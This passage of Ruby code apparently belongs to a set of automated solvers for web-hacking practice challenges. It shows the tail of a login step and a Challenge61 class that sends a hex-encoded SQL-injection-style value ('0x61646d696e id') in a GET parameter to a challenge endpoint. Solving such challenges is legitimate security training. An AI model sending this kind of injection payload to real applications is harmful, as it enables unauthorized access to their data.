        }
      )

      log('Logging in')
      response = post(
        PATH,
        {
          PARAM_LID => ID,
          PARAM_LPHONE => PHONE
        }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 61
  class Challenge61 < ChallengeBase
    CHALLENGE = 61

    PATH = '/challenge/web-38/'
    PARAM_ID = 'id'
    PAYLOAD = '0x61646d696e id'

    def exec
      query = URI.encode_www_form(PARAM_ID => PAYLOAD)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end
end
